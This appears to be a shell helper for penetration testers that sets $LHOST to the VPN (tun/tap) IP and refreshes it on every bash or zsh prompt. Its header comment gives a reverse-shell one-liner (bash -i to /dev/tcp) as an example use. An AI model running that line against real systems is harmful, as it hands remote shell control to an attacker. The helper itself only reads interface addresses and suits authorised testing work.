# LHOST from the VPN interface — source from ~/.bashrc and/or ~/.zshrc:
#     source ~/.config/pentest/lhost.sh
#
# Exports $LHOST = your VPN (tun0) IP and refreshes it on every prompt, so it
# tracks the VPN connecting/disconnecting and is always current in reverse-shell
# one-liners (e.g.  bash -i >& /dev/tcp/$LHOST/443 0>&1).
# Override the interface with:  export VPN_IF=tun1

_vpn_ip() {
  local dev ip
  for dev in "${VPN_IF:-}" tun0 tun1; do
    [ -n "$dev" ] || continue
    ip=$(ip -4 -o addr show "$dev" 2>/dev/null | awk '{print $4}' | cut -d/ -f1)
    [ -n "$ip" ] && { printf '%s\n' "$ip"; return 0; }
  done
  # fall back to the first tun*/tap* interface that's up
  ip=$(ip -4 -o addr show 2>/dev/null | awk '$2 ~ /^(tun|tap)/ {print $4; exit}' | cut -d/ -f1)
  [ -n "$ip" ] && { printf '%s\n' "$ip"; return 0; }
  return 1
}

_set_lhost() {
  local ip
  if ip=$(_vpn_ip); then export LHOST="$ip"; else unset LHOST; fi
}

# `lhost` — print the current VPN IP on demand
lhost() { _vpn_ip || { echo "lhost: no VPN (tun/tap) interface up" >&2; return 1; }; }

# refresh $LHOST before every prompt
if [ -n "${ZSH_VERSION:-}" ]; then
  typeset -ga precmd_functions
  case " ${precmd_functions[*]} " in *" _set_lhost "*) ;; *) precmd_functions+=(_set_lhost);; esac
elif [ -n "${BASH_VERSION:-}" ]; then
  case "${PROMPT_COMMAND:-}" in
    *_set_lhost*) ;;
    *) PROMPT_COMMAND="_set_lhost${PROMPT_COMMAND:+; $PROMPT_COMMAND}" ;;
  esac
fi

_set_lhost   # set immediately for the current shell
